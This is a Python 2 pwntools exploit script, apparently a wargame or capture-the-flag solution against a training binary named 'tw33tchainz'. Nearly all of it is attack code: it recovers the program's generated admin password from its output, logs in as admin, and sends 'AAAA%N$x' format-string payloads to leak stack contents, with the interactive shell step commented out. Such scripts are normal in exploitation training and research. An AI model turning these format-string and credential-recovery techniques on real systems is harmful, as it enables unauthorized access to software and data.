#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template tw33tchainz
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tw33tchainz')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

context.terminal = ["xfce4-terminal", "-e"]
libc =  ELF("/usr/lib32/libc.so.6")
rop  =  ROP(libc)
io = start()

def crack_password():
    username = "\x00" * 0x0f
    salt     = "\x00" * 0x0f

    io.recvuntil("Enter Username: \n")
    io.send(username)
    io.recvuntil("Enter Salt: \n")
    io.sendline(salt)
    io.recvuntil("Generated Password:\n")
    password = io.recvline().lstrip().rstrip()

    log.info("Got password: " + password)

    secret = ''
    for elem in [password[i:i+8] for i in range(0, len(password), 8)]:
        secret += p32(int(elem, 16))
    log.info("Recovered: " + secret)

    return secret


def do_tweet(msg):
    io.recvuntil("Enter Choice: ")
    io.sendline("1")
    io.recvuntil("Enter tweet data (16 bytes): ")
    io.sendline(msg)
    io.recvuntil("Please do not try to lop off our birdies heads :(\n")
    io.sendline()
    log.info("Tweeted: " + msg)

def get_admin(password):
    io.recvuntil("Enter Choice: ")
    io.sendline("3")
    io.recvuntil("Enter password: ")
    io.sendline(password)
    recv = io.recvline()
    log.info(recv)

    if "Nope" in recv:
        return False
    return True

def leak_argN(n):
    craft = "AAAA%{}$x".format(n)
    do_tweet(craft)
    io.recvuntil("AAAA")

    return io.recvline().rstrip()[:-9]

def dump_stack(args):
    data = []
    for arg in args:
        data.append(leak_argN(arg))

    for (i, dump) in enumerate(data):
        print ("{} | {} ({})".format(i + 1, dump, p32(int(dump, 16))))

secret = crack_password()
if not get_admin(secret):
    log.error("Failed to get admin")
    exit(-1)

dump_stack(range(1, 20))

#io.interactive()

